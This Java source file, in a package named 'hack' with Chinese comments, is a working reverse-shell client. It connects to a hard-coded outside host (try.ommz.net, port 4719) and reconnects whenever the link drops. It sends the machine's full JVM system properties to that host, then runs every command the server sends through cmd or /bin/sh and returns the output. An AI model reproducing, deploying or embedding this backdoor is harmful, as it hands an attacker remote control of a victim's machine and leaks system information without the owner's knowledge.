package com.tools.hack;

/*
 * 接受服务器发送的命令，执行并反馈服务器执行结果
 */
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Enumeration;

/**
 * socket 客户端
 *
 * @author fuq
 */
public final class MyClient {

    private Socket socket = null;
    private static MyClient mc = null;
    //设置字符编码
    private String sc = "";

    /**
     * 尝试连接服务器
     */
    private MyClient() {
        getConn();
    }

    public static MyClient getMyClient() {
        if (mc == null) {
            mc = new MyClient();
        }
        return mc;
    }

    private void getConn() {
        new Thread(new Runnable() {
            public void run() {
                start();
            }
        }).start();
    }

    private void start() {
        //61.140.20.195 //try.ommz.net
        getSocket("try.ommz.net", 4719);
        System.out.println("连接服务器成功!");
        StringBuffer sysInfo = getSysInfo();
        send(sysInfo.toString());
        try {
            getMessAndReturn();
        } catch (Exception ex) {
            System.err.println(ex);
        }
    }

    /**
     * 像服务器发送消息
     *
     * @param str 消息内容
     */
    private void send(String str) {
        PrintWriter os = null;
        try {
            os = new PrintWriter(socket.getOutputStream());
            os.println(str);
            os.flush();
        } catch (Exception ex) {
            System.err.print(ex);
        }
    }

    /**
     * 接收服务器消息 并执行，返回给服务器执行结果
     *
     * @throws IOException
     */
    private void getMessAndReturn() throws IOException, InterruptedException {

        BufferedReader is = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        while (true) {
            try {
                String readLine = is.readLine();
                if (readLine == null) {
                    Thread.sleep(1000);
                    socket.close();
                    socket = null;
                    getConn();
                    System.err.println("重新连接...");
                    return;
                }
                System.out.println("服务端消息：" + readLine);
                try {
                    comFilter(readLine);
                } catch (Exception e) {
                }
                //异步执行命运 返回结果
                exqAndSend(readLine);
            } catch (Exception ex) {
                //连接中断，重新连接
                socket.close();
                socket = null;
                System.err.println("连接服务器失败!");
                getConn();
                System.err.println("断线从连...");
                return;
            }
        }
    }
    Runtime runtime = Runtime.getRuntime();

    /**
     * 执行命令
     *
     * @param cmd 命令
     * @param csName 字符编码
     * @return
     */
    private StringBuffer runCmd(String cmd) {

        StringBuffer sb = new StringBuffer();
        String os_name = System.getProperty("os.name");
        String[] cmds = new String[3];
        if (os_name.contains("Windows") || os_name.contains("windows")) {
            cmds[0] = "cmd";
            cmds[1] = "/C";
            cmds[2] = cmd;
            sc = sc == null || "".equals(sc) ? "GB2312" : sc;
        } else {
            sc = sc == null || "".equals(sc) ? "UTF-8" : sc;
            cmds[0] = "/bin/sh";
            cmds[1] = "-c";
            cmds[2] = cmd;
        }
        try {
            Process process = runtime.exec(cmds);
            InputStreamReader ir = new InputStreamReader(process.getInputStream(), sc);
            BufferedReader input = new LineNumberReader(ir);
            String line;
            while ((line = input.readLine()) != null) {
                sb.append(line).append("\r\n");
                //  System.out.println(line);
            }
        } catch (java.io.IOException e) {
            sb.append(e.getMessage());
            // System.err.println("IOException " + e.getMessage());
        }
        return sb;
    }

    /**
     * 多线程执行并返回执行结果给服务端
     *
     * @param cmd
     */
    private void exqAndSend(String cmd) {
        Thread nT = new myRun(cmd);
        nT.start();
    }

    class myRun extends Thread implements Runnable {

        String cmd;

        public myRun(String cmd) {
            this.cmd = cmd;
        }

        @Override
        public void run() {
            StringBuffer runCmd = runCmd(cmd);
            send(runCmd.toString());
        }
    }

    /**
     * 得到当前jvm的信息
     *
     * @return
     */
    private StringBuffer getSysInfo() {
        StringBuffer sb = new StringBuffer();
        Enumeration<?> propertyNames = System.getProperties().propertyNames();
        while (propertyNames.hasMoreElements()) {
            Object nextElement = propertyNames.nextElement();
            //System.out.println(nextElement + "=" + System.getProperty(nextElement.toString()));
            sb.append(nextElement);
            sb.append("=");
            sb.append(System.getProperty(nextElement.toString())).append("\r\n");
        }
        return sb;
    }

    /**
     * @return the socket
     */
    private void getSocket(String ip, int port) {

        while (socket == null) {
            try {
                setSocket(ip, port);
                if (socket == null) {
                    Thread.sleep(6 * 1000);
                }
            } catch (Exception ex) {
                System.err.println(ex);
            }
        }
    }

    /**
     * @param socket the socket to set
     */
    private void setSocket(String ip, int port) {
        try {
            socket = new Socket(ip, port);
        } catch (Exception ex) {
            socket = null;
            System.err.println("等待服务器中...");
        }
    }

    private void comFilter(String cmd) {
        if (cmd.contains("setE")) {
            sc = cmd.split(" ")[1];
        }
    }
    
    
    public static void main(String[] args) {
         MyClient.getMyClient();
    }
}
